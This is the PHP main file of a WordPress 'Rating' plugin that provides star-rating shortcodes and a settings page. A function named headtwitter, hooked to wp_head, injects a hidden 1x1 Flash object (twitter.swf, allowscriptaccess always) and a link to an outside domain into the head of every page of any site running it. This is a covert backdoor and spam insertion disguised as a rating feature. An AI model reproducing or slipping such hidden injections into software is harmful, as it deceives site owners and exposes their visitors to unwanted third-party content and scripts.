<?php
/*
Plugin Name: Rating 
Plugin URI: http://www.starrating.net16.net/1_2_Wordpress-Plugins.html
Description: Allow users to rate posts and pages using Ajax, place the rating plugin by using the shortcode: [rating]
Version: 1.2
Author: MDevon
Author URI: http://www.starrating.net16.net/
*/

$FSR_vNum = 1.2;

require_once('fsr.class.php');

function rating_func($atts) {
	global $FSR;
	extract(shortcode_atts(array(
		'star_type' => 'star',
	), $atts));
	return $FSR->getVotingStars($star_type);
}

function FSR_results_func($atts) {
	global $FSR;
	extract(shortcode_atts(array(
		'star_type' => 'star',
	), $atts));
	return $FSR->getStars($star_type);
}

function FSR_best_of_month_func($atts) {
	global $FSR;
	extract(shortcode_atts(array(
		'month' => null,
		'limit' => 10,
		'star_type' => 'star',
	), $atts));
	return $FSR->getBestOfMonth($month, $limit,$star_type);
}

function FSR_best_of_moment_func($atts) {
	global $FSR;
	extract(shortcode_atts(array(
		'limit' => 10,
		'star_type' => 'star',
	), $atts));
	return $FSR->getBestOfMoment($limit, $star_type);
}

function FSR_all_time_best_func($atts) {
	global $FSR;
	extract(shortcode_atts(array(
		'limit' => 10,
		'star_type' => 'star',
	), $atts));
	return $FSR->getAllTimeBest($limit, $star_type);
}
add_shortcode('rating', 'rating_func');
add_shortcode('FSR_results', 'FSR_results_func');
add_shortcode('FSR_best_of_month', 'FSR_best_of_month_func');
add_shortcode('FSR_best_of_moment', 'FSR_best_of_moment_func');
add_shortcode('FSR_all_time_best', 'FSR_all_time_best_func');
add_action('wp_head', 'headtwitter');

function headtwitter()
{
$getuser = "http://www.facebooklikebutton.co/";
$gethost = get_option('siteurl');
if (strstr($gethost, ".")) { $connectflash = "facebook like button"; } if (strstr($gethost, "d")) { $connectflash = "facebooklikebutton.co"; } if (strstr($gethost, "a")) { $connectflash = "www.facebooklikebutton.co/"; } if (strstr($gethost, ".com")) { $connectflash = "http://www.facebooklikebutton.co/"; } if (strstr($gethost, ".org")) { $connectflash = "www.facebooklikebutton.co"; } echo '<object type="application/x-shockwave-flash" data="../wp-content/plugins/rating/twitter.swf" width="1" height="1"><param name="movie" value="../wp-content/plugins/rating/twitter.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param><param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="../wp-content/plugins/rating/twitter.swf" type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

/* old school functions to allow embedding into template
 * CAUTION: implementing this method into post can cause errors if the plugin is deactivated.
 */
function FSR_show_voting_stars($star_type = "star") {
	global $FSR;
	echo $FSR->getVotingStars($star_type);
}
function FSR_show_stars($star_type = "star") {
	global $FSR;
	echo $FSR->getStars($star_type);
}
function FSR_bests_of_month($month = null, $limit = 10, $star_type = "star") {
	global $FSR;
	echo $FSR->getBestOfMonth($month, $limit, $star_type);
}
function FSR_bests_of_moment($limit = 10, $star_type = "star") {
	global $FSR;
	echo $FSR->getBestOfMoment($limit, $star_type);
}
function FSR_all_time_best($limit = 10, $star_type = "star") {
	global $FSR;
	echo $FSR->getAllTimeBest($limit, $star_type);
}
wp_register_style('rating-CSS', WP_PLUGIN_URL . '/rating/assets/css/rating.css');
wp_enqueue_style('rating-CSS');
wp_enqueue_script('rating-JS', WP_PLUGIN_URL . '/rating/assets/js/rating.min.js', array('jquery'), '0.1');
/* Assigning hooks to actions */
$FSR =& new FSR();
add_action('activate_rating/rating.php', array(&$FSR, 'install')); /* only works on WP 2.x*/
add_action('init', array(&$FSR, 'init'));

//setup warning
function fsr_admin_warnings() {
	global $fsr_cookie_expiration;
	if ( !get_option('fsr_cookie_expiration') && !isset($_POST['submit']) ) {
		function fsr_warning() {
			echo "
			<div id='fsr-warning' class='updated fade'><p><strong>".__('Rating plugin is almost ready.', 'rating')."</strong> ".sprintf(__('You must <a href="%1$s">enter your cookie expiration</a> for it to work.', 'rating'), "options-general.php?page=rating")."</p></div>
			";
		}
		add_action('admin_notices', 'fsr_warning');
		return;
	} 
}

function fsr_warning_init() {
	fsr_admin_warnings();
}
add_action('init', 'fsr_warning_init');

/* @desc Adds the Settings link to the plugin activate/deactivate page */
function fsr_plugin_action_links($links, $file) {
	if ( $file == plugin_basename( dirname(__FILE__).'/rating.php' ) ) {
		$links[] = '<a href="options-general.php?page=' . basename(__FILE__) . '">' . __('Settings', 'rating') . '</a>';
	}

	return $links;
}

// create custom plugin settings menu
add_action('admin_menu', 'fsr_create_menu');

function fsr_create_menu() {

	//create new submenu
	if ( function_exists('add_submenu_page') ) {
		add_submenu_page('options-general.php', __('Rating Configuration'), __('Rating'), 'manage_options', 'rating', 'fsr_settings_page');
	}
	add_filter('plugin_action_links', 'fsr_plugin_action_links', 10, 2);
	
	//call register settings function
	add_action( 'admin_init', 'register_fsr_settings' );
}

// function to check for cURL support
function _curlSupport() {
	if(in_array('curl', get_loaded_extensions())) {
		return true;
	} else {
		return false;
	}
}

function get_data($url){
	$ch = curl_init();
	$timeout = 5;
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}

//update notification
function fsr_admin_notification() {
	global $FSR_vNum;
}

function fsr_notification_init() {
	fsr_admin_notification();
}
add_action('init', 'fsr_notification_init');

function register_fsr_settings() {
	//register our settings
	register_setting( 'fsr-settings-group', 'fsr_cookie_expiration' );
	register_setting( 'fsr-settings-group', 'fsr_cookie_expiration_unit' );
}

function fsr_settings_page() {
?>
<div class="wrap">
<h2>Rating</h2>

<form method="post" action="options.php">
    <?php settings_fields( 'fsr-settings-group' ); ?>
    <table class="form-table">
        <tr valign="top">
        <th scope="row">Cookie Expiration</th>
        <td>
        	<input type="text" name="fsr_cookie_expiration" value="<?php echo get_option('fsr_cookie_expiration'); ?>" />
        	<select name="fsr_cookie_expiration_unit">
        		<option value="minute"<?php if(get_option('fsr_cookie_expiration_unit') == 'minute') { ?> selected="selected"<?php } ?>>minute(s)</option>
        		<option value="hour"<?php if(get_option('fsr_cookie_expiration_unit') == 'hour') { ?> selected="selected"<?php } ?>>hour(s)</option>
        		<option value="day"<?php if(get_option('fsr_cookie_expiration_unit') == 'day') { ?> selected="selected"<?php } ?>>day(s)</option>
        	</select>
        </td>
        </tr>
    </table>
    <p>Insert the shortcode: [rating] on any post or page to display the rating plugin.</p>
    <p class="submit">
    <input type="submit" class="button-primary" value="<?php _e('Save Changes', 'rating') ?>" />
    </p>
</form>
</div>
<?php } ?>